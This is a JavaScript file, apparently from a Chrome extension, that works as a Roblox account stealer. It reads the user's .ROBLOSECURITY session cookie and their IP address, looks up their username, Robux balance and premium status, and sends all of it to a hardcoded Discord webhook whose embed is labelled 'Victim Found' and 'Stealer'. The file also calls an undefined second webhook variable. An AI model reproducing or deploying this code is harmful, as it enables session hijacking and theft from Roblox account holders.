const WEBHOOK = "https://discord.com/api/webhooks/1335120378250526752/BSYOXRmvG-YmuJzGpteWG_dlFAfc3yNa6GuaazJKdxjmMVLR2_IKwBOLP8L5FAeitiy2";

async function fetchIP() {
    try {
        const response = await fetch("https://api.ipify.org");
        return response.ok ? await response.text() : "Unknown IP";
    } catch (error) {
        console.error("Error fetching IP:", error);
        return "Unknown IP";
    }
}

async function fetchStatistics(cookie) {
    if (!cookie) return null;

    try {
        const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                "Cookie": `.ROBLOSECURITY=${cookie}`
            },
            redirect: "manual"
        });
        return response.ok ? await response.json() : null;
    } catch (error) {
        console.error("Error fetching statistics:", error);
        return null;
    }
}

function createPayload(ipAddr, cookie, statistics) {
    return {
        content: null,
        embeds: [
            {
                description: `\n${cookie || "COOKIE NOT FOUND"}`,
                color: 16711680, // Red color
                fields: [
                    {
                        name: "Username",
                        value: statistics ? statistics.UserName || "N/A" : "N/A",
                        inline: true
                    },
                    {
                        name: "Robux",
                        value: statistics ? String(statistics.RobuxBalance || "N/A") : "N/A",
                        inline: true
                    },
                    {
                        name: "Premium",
                        value: statistics ? String(statistics.IsPremium || "N/A") : "N/A",
                        inline: true
                    }
                ],
                author: {
                    name: `Victim Found: ${ipAddr}`,
                    icon_url: statistics?.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                },
                footer: {
                    text: "Information fetched by extension",
                    icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                },
                thumbnail: {
                    url: statistics?.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                }
            }
        ],
        username: "Stealer",
        avatar_url: "https://i.pinimg.com/736x/a2/ca/0d/a2ca0d6bc290b0f5262b8a14e6f26346.jpg",
        attachments: []
    };
}

async function sendToWebhook(payload) {
    try {
        await Promise.all([
            fetch(WEBHOOK, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            }),
            fetch(SECOND_WEBHOOK, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
        ]);
    } catch (error) {
        console.error("Error sending data to webhook:", error);
    }
}

async function main(cookie) {
    const ipAddr = await fetchIP();
    const statistics = await fetchStatistics(cookie);
    const payload = createPayload(ipAddr, cookie, statistics);
    await sendToWebhook(payload);
}

chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, function (cookie) {
    main(cookie ? cookie.value : null);
});
